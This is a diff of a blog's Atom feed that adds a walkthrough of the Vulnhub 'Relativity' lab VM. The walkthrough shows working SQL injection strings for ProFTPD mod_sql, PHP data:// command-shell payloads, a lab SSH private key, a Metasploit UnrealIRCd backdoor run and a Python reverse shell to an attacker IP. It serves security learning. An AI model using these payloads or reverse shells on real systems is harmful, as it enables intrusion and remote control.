@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2015-05-09T16:47:38+03:00</updated>
+  <updated>2015-05-26T20:41:52+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,568 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Relativity]]></title>
+    <link href="http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity/"/>
+    <updated>2015-05-10T16:40:50+03:00</updated>
+    <id>http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity</id>
+    <content type="html"><![CDATA[<p>I selected the Relativity VM from Vulnhub as my next home lab target. The objective is to read <code>/root/flag.txt</code>. Let&rsquo;s get started!</p>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> nmap -A -p1-65535 192.168.80.128
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-10 16:46 EEST
+</span><span class='line'>Nmap scan report for 192.168.80.128
+</span><span class='line'>Host is up (0.00058s latency).
+</span><span class='line'>Not shown: 65532 filtered ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>21/tcp open  ftp
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
+</span><span class='line'>|_  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
+</span><span class='line'>|_http-title: M.C. Escher - Relativity
+</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+</span><span class='line'>SF-Port21-TCP:V=6.47%I=7%D=5/10%Time=554F618E%P=x86_64-unknown-linux-gnu%r
+</span><span class='line'>SF:(GenericLines,29,"220\x20Welcome\x20to\x20Relativity\x20FTP\x20\(mod_sq
+</span><span class='line'>SF:l\)\r\n");
+</span><span class='line'>MAC Address: 00:0C:29:9F:1D:0E (VMware)
+</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 2.6.X|3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 2.6.32 - 3.10
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>Service Info: Host: Relativity</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The web server doesn&rsquo;t seem to serve anything else than an image. I ran Nikto and Dirbuster on it but didn&rsquo;t find anything. Next I hit the FTP server. No anonymous login possible, but there was something interesting in the banner:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>220 Welcome to Relativity FTP (mod_sql)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I started googling, and it turns out that <a href="http://www.proftpd.org/docs/contrib/mod_sql.html">&ldquo;The mod_sql module is an authentication and logging module for ProFTPD&rdquo;</a>. The good news is, <a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">there is a SQLi vulnerability</a> in the USER command that might allow access to the server. I don&rsquo;t know the version of our target server, but let&rsquo;s try it!</p>
+
+<p>On <a href="http://www.securityfocus.com/bid/33722/exploit">http://www.securityfocus.com/bid/33722/exploit</a> you can find some sample exploit strings:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
+</span><span class='line'>password: 1
+</span><span class='line'>
+</span><span class='line'>username: %') and 1=2 union (select &lt;name&gt;,1,&lt;uid&gt;,&lt;gid&gt;,0x2F,0x2F62696E2F62617368); -- a</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Neither worked, but I tinkered with the comment characters and found out that I could get in either by replacing the <em>&mdash;</em> with a <em>#</em>, or by inserting a space and random characters after the <em>&mdash;</em>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>220 Welcome to Relativity FTP (mod_sql)
+</span><span class='line'>Name (192.168.80.128:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
+</span><span class='line'>331 Password required for username:.
+</span><span class='line'>Password:
+</span><span class='line'>230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
+</span><span class='line'>Remote system type is UNIX.
+</span><span class='line'>Using binary mode to transfer files.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, I found out an interesting looking directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; pwd
+</span><span class='line'>257 "/" is current directory.
+</span><span class='line'>ftp&gt; dir
+</span><span class='line'>200 PORT command successful
+</span><span class='line'>150 Opening ASCII mode data connection for file list
+</span><span class='line'>drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
+</span><span class='line'>-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
+</span><span class='line'>-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
+</span><span class='line'>226 Transfer complete.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It seems we are in the root directory, but the html and image file hint at the web server. So I went to the website again and this time I tried to navigate to that new directory:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/relativity/secretdir.png" title="secretdir" alt="secretdir"></p>
+
+<p>I looked around at the pages, noticed the URL when accessing them looks something like this: <code><a href="http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php">http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php</a></code>. So I tried some local file inclusion, but it didn&rsquo;t get me anywhere. To get to the next step, I needed some external reading and inspiration. For the exploit, we can leverage PHP&rsquo;s <a href="http://php.net/manual/en/wrappers.php">stream wrappers</a>: PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). On <a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">this blog post</a> there is a nice explanation and examples of how to get remote code execution by leveraging the <a href="http://php.net/manual/en/wrappers.data.php">data stream</a>. If you look at the examples, you can see that the content passed as a base64 string is being interpreted.
+Check page 9 of <a href="https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf">this pdf</a> for a summary of this remote file inclusion technique. Bottom line: we can base64 encode PHP commands and feed them to the target. So to test this out:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># simple RFI
+</span><span class='line'>page=data://text/plain, &lt;?php system("whoami");?&gt;
+</span><span class='line'>
+</span><span class='line'># base64 encoded RFI
+</span><span class='line'>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==
+</span><span class='line'>
+</span><span class='line'># mini shell
+</span><span class='line'>page=data://text/plain,&lt;?php system($_GET[cmd]);?&gt;&cmd=id
+</span><span class='line'>
+</span><span class='line'># base64 + URL encoded mini shell (didn't work without URL encoding)
+</span><span class='line'>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And we are free to enumerate! Next thing I did was to read <em>/etc/passwd</em> (look at it in the source code of the page for better readability). This gave me the name of 2 users on the machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>---
+</span><span class='line'>mauk:x:1001:1001::/home/mauk:/bin/bash
+</span><span class='line'>jetta:x:1002:1002::/home/jetta:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I looked around some more, and when listing the home directories, I noticed that mauk&rsquo;s home folder permissions aren&rsquo;t what they should be (but good for us!):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>drwx------. 3 jetta jetta 4096 Jul  9  2013 jetta
+</span><span class='line'>drwxr-xr-x. 3 mauk  mauk  4096 Jul  9  2013 mauk</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looking in mauk&rsquo;s directory, this is interesting:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Even better, inside there is mauk&rsquo;s private SSH key!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r--r--. 1 mauk mauk 1679 Feb 24  2013 id_rsa
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And we can read it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
+</span><span class='line'>9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
+</span><span class='line'>5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
+</span><span class='line'>zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
+</span><span class='line'>ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
+</span><span class='line'>xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
+</span><span class='line'>tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
+</span><span class='line'>jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
+</span><span class='line'>f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
+</span><span class='line'>r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
+</span><span class='line'>Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
+</span><span class='line'>BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
+</span><span class='line'>MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
+</span><span class='line'>szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
+</span><span class='line'>YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+</span><span class='line'>+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
+</span><span class='line'>3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
+</span><span class='line'>Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
+</span><span class='line'>3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
+</span><span class='line'>ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
+</span><span class='line'>dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
+</span><span class='line'>J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
+</span><span class='line'>ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
+</span><span class='line'>bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
+</span><span class='line'>aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
+</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can save this private key on our machine and use it to log in as mauk! After looking around without any major discoveries, I noticed this folder in <em>/opt/</em>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[mauk@Relativity ~]$ ls -l /opt
+</span><span class='line'>total 4
+</span><span class='line'>drwx------ 13 jetta jetta 4096 May 20 18:32 Unreal</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That means there is an Unreal IRCd server there! But I didn&rsquo;t find one when port scanning. Looking at the listening programs, there is indeed an IRC server listening on localhost on port 6667:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[mauk@Relativity ~]$ netstat -lntp
+</span><span class='line'>(No info could be read for "-p": geteuid()=1001 but you should be root.)
+</span><span class='line'>Active Internet connections (only servers)
+</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span><span class='line'>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span><span class='line'>tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The ircd server might be an avenue for privilege escalation to jetta:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[mauk@Relativity ~]$ ps -u jetta
+</span><span class='line'>  PID TTY          TIME CMD
+</span><span class='line'>  557 ?        00:00:00 ircd</span></code></pre></td></tr></table></div></figure>
+
+
+<p>But there was no netcat installed on the machine, so to find some information about the irc server, I set up SSH port forwarding so I can access it from my machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128 
+</span><span class='line'>Last login: Sat May 23 18:25:04 2015 from 192.168.80.130
+</span><span class='line'>[mauk@Relativity ~]$ </span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now I could port scan my local 4444 port to learn more:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -A -sV 127.0.0.1 4444
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-23 16:31 EEST
+</span><span class='line'>setup_target: failed to determine route to 4444 (0.0.17.92)
+</span><span class='line'>Nmap scan report for localhost (127.0.0.1)
+</span><span class='line'>Host is up (0.000065s latency).
+</span><span class='line'>Not shown: 999 closed ports
+</span><span class='line'>PORT     STATE SERVICE VERSION
+</span><span class='line'>4444/tcp open  irc     Unreal ircd
+</span><span class='line'>| irc-info: 
+</span><span class='line'>|   server: relativity.localdomain
+</span><span class='line'>|   version: Unreal3.2.8.1. relativity.localdomain 
+</span><span class='line'>|   servers: 1
+</span><span class='line'>|   users: 1
+</span><span class='line'>|   lservers: 0
+</span><span class='line'>|   lusers: 1
+</span><span class='line'>|   uptime: 0 days, 0:51:08
+</span><span class='line'>|   source host: rox-D2735CD4
+</span><span class='line'>|_  source ident: nmap</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I googled the version and it contains a backdoor, and there is a Metasploit module for it. I fired up Metasploit and used against my localhost and port (remember the port forwarding), and got a shell as jetta! But if you want to know more about the backdoor and how to exploit it manually, read <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">this</a>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; run
+</span><span class='line'>
+</span><span class='line'>[*] Started reverse handler on 192.168.80.130:5555 
+</span><span class='line'>[*] Connected to 127.0.0.1:4444...
+</span><span class='line'>    :relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
+</span><span class='line'>[*] Sending backdoor command...
+</span><span class='line'>[*] Command shell session 1 opened (192.168.80.130:5555 -&gt; 192.168.80.128:41061) at 2015-05-23 17:18:12 +0300
+</span><span class='line'>
+</span><span class='line'>whoami
+</span><span class='line'>jetta</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In jetta&rsquo;s home directory there is a directory named <code>auth_server</code> with a binary inside. I ran <em>strings</em> on it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>strings /home/jetta/auth_server/auth_server
+</span><span class='line'>/lib64/ld-linux-x86-64.so.2
+</span><span class='line'>__gmon_start__
+</span><span class='line'>libc.so.6
+</span><span class='line'>fflush
+</span><span class='line'>puts
+</span><span class='line'>putchar
+</span><span class='line'>printf
+</span><span class='line'>poll
+</span><span class='line'>stdout
+</span><span class='line'>system
+</span><span class='line'>__libc_start_main
+</span><span class='line'>GLIBC_2.2.5
+</span><span class='line'>l$ L
+</span><span class='line'>t$(L
+</span><span class='line'>|$0H
+</span><span class='line'>[+] Checking Certificates... 
+</span><span class='line'>done
+</span><span class='line'>[+] Contacting server, please wait... 
+</span><span class='line'>could not establish connection
+</span><span class='line'>invalid certificates
+</span><span class='line'>error: (12)
+</span><span class='line'>fortune -s | /usr/bin/cowsay
+</span><span class='line'>Starting Auth server..
+</span><span class='line'>;*3$"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interesting. This binary also appears to be owned as root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /home/jetta/auth_server/auth_server
+</span><span class='line'>-rwxr-xr-x 1 root root 8010 Mar  8  2013 /home/jetta/auth_server/auth_server</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried to <em>sudo -l</em> to see if jetta can run any commands as root, but there was no output in my shell. So I checked if the shell I have is interactive using <a href="http://unix.stackexchange.com/questions/26676/how-to-check-if-a-shell-is-login-interactive-batch">this SO post</a>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[[ $- == *i* ]] && echo 'Interactive' || echo 'Not interactive'
+</span><span class='line'>Not interactive</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I then read <a href="http://netsec.ws/?p=337">this post</a> about spawning a TTY shell and used the first of the choices for a proper shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'import pty; pty.spawn("/bin/sh")'
+</span><span class='line'>sh-4.2$ sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'>Matching Defaults entries for jetta on this host:
+</span><span class='line'>    requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+</span><span class='line'>    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+</span><span class='line'>    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+</span><span class='line'>    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+</span><span class='line'>    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+</span><span class='line'>    XAUTHORITY PATH", env_reset
+</span><span class='line'>
+</span><span class='line'>User jetta may run the following commands on this host:
+</span><span class='line'>    (root) NOPASSWD: /home/jetta/auth_server/auth_server</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Excellent, so the key to getting root is in exploiting that binary we found earlier. I ran it to see what it does:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ /home/jetta/auth_server/auth_server
+</span><span class='line'>/home/jetta/auth_server/auth_server
+</span><span class='line'>[+] Checking Certificates...done
+</span><span class='line'>[+] Contacting server, please wait...could not establish connection
+</span><span class='line'>error: (12)
+</span><span class='line'> _________________________ 
+</span><span class='line'>&lt; There isn't any problem &gt;
+</span><span class='line'> ------------------------- 
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I ran it several times for fun, made a mental note to replace my fortune cookies at the end of the blog posts with cowsay fortune cookies because this is purely awesome, then looked at <em>strings</em> again. Looking at the line <code>fortune -s | /usr/bin/cowsay</code>, we see that the <em>fortune</em> command doesn&rsquo;t use an absolute path. So we can create a program of our choosing called fortune and modify our PATH variable to start looking in the location of our program. At this point I tried several ways to get a local or reverse root shell but I kept getting errors that the fortune file is busy, so instead of running the exploit every time and then getting a TTY shell on top of it, I thought maybe I can log in directly as jetta now and work from there. So I made a <code>.ssh</code> directory inside jetta&rsquo;s home folder and copied there mauk&rsquo;s <code>authorized_keys</code> file (remember the permissions were too lax). So now I could directly ssh as jetta and try again for the shell.</p>
+
+<p>This time I used a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Python reverse shell</a>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.130",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></td></tr></table></div></figure>
+
+
